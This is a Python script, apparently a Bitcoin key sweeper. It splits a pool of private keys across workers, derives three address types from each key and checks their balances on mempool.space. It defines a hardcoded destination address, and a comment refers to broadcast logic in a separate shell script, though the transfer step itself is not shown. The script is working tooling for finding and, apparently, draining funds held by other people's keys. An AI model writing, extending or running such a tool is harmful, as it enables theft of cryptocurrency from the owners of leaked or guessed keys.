import os, requests, time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 10

def check_balance(priv):
    try:
        k = Key(priv.strip(), network='bitcoin')
        for witness in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness)
            print(f"🔎 W{WORKER_ID}: {addr}")
            
            r = requests.get(f"https://mempool.space/api/address/{addr}").json()
            bal = r.get('chain_stats', {}).get('funded_txo_sum', 0) - r.get('chain_stats', {}).get('spent_txo_sum', 0)
            
            if bal > 0:
                print(f"🚨 SALDO! {addr}: {bal}")
                # Aqui entra a lógica de broadcast do seu run_worker.sh
                return True
            time.sleep(0.2)
    except: pass
    return False

if __name__ == "__main__":
    if os.path.exists('MASTER_POOL.txt'):
        with open('MASTER_POOL.txt', 'r') as f:
            all_keys = f.readlines()
        
        # Divisão matemática exata das chaves
        my_keys = [all_keys[i] for i in range(len(all_keys)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
        
        print(f"🚀 Worker {WORKER_ID} iniciando {len(my_keys)} chaves.")
        for key in my_keys:
            check_balance(key)
